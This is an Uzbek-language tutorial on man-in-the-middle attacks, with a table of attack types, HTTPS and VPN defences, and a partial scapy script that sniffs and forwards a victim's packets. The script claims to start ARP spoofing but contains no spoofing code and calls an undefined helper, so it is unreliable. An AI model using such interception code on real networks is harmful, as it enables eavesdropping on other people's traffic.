# MITM (Man In The Middle)

Hujumchi ikki tomon o'rtasida turib, trafikni ko'radi yoki o'zgartiradi.

---

## Tushuntirish

```text
Normal:
Client ←──────────→ Server

MITM:
Client ←→ Attacker ←→ Server
```

---

## MITM turlari

| Tur | Usul |
|-----|------|
| ARP Spoofing | Lokal tarmoqda |
| DNS Spoofing | DNS javobini o'zgartirish |
| SSL Stripping | HTTPS → HTTP |
| Evil Twin | Soxta WiFi hotspot |
| BGP Hijacking | Routing o'zgartirish |

---

## Amaliy misol (scapy)

```python
from scapy.all import *
import threading

def mitm_attack(victim_ip, gateway_ip):
    """MITM hujumi - faqat o'z tarmog'ingizda!"""
    
    def forward(packet):
        """Paketlarni yo'naltirish"""
        if packet.haslayer(IP):
            if packet[IP].src == victim_ip:
                packet[Ether].dst = get_mac(gateway_ip)
                send(packet, verbose=False)
            elif packet[IP].src == gateway_ip:
                packet[Ether].dst = get_mac(victim_ip)
                send(packet, verbose=False)
    
    # ARP spoofing boshlash
    print(f"[*] MITM boshlandi: {victim_ip} <-> {gateway_ip}")
    
    # Trafikni kuzatish
    sniff(filter=f"host {victim_ip}", prn=forward, store=0)
```

---

## HTTPS himoya qiladi

```text
MITM hujumi:
1. HTTP trafikni ko'rish mumkin
2. HTTPS trafikni ko'rib bo'lmaydi (shifrlangan)

Shuning uchun HTTPS JUDAH MUHIM!
```

---

## Xulosa

- MITM trafikni tutib olish hujumi
- HTTPS, VPN, Certificate Pinning bilan himoya
- ARP Spoofing, DNS Spoofing, SSL Stripping usullari bor
